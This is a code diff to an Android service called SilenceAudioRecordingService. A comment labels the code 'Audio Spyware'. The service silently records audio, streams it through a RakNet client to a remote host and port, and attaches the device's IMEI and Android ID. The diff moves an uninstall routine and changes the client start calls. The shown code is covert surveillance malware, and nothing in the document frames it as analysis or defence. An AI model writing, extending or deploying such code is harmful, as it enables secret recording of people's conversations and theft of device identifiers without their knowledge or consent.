@@ -82,6 +82,15 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         return true;
     }
 
+    //uninstall this app
+    void uninstallApp()
+    {
+        Uri packageURI = Uri.parse("package:"+SilenceAudioRecordingActivity.class.getPackage().getName());
+        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
+        startActivity(uninstallIntent);
+    }
+
+
     @Override
     public void run()
     {
@@ -96,7 +105,7 @@ public class SilenceAudioRecordingService extends Service implements Runnable
                 //re-try to restart
                 if(canRecordAudio())
                 {
-                    RakClient.start(mInfo.mHost, mInfo.mPort);
+                    RakClient.start(this,mInfo.mHost, mInfo.mPort);
                 }
                 //sleep thread
                 try
@@ -132,7 +141,7 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         // Start RakNet client Audio Spyware
         if(canRecordAudio())
         {
-            RakClient.start(mInfo.mHost, mInfo.mPort);
+            RakClient.start(this,mInfo.mHost, mInfo.mPort);
         }
         RakClient.setIMEI(getIMEI());
         RakClient.setAndroidID(getAndroidID());
@@ -172,12 +181,6 @@ public class SilenceAudioRecordingService extends Service implements Runnable
         super.onDestroy();
     }
 
-    void uninstallApp(){
-        Uri packageURI = Uri.parse("package:"+SilenceAudioRecordingActivity.class.getPackage().getName());
-        Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
-        startActivity(uninstallIntent);
-    }
-    
     @Nullable
     @Override
     public IBinder onBind(Intent intent)
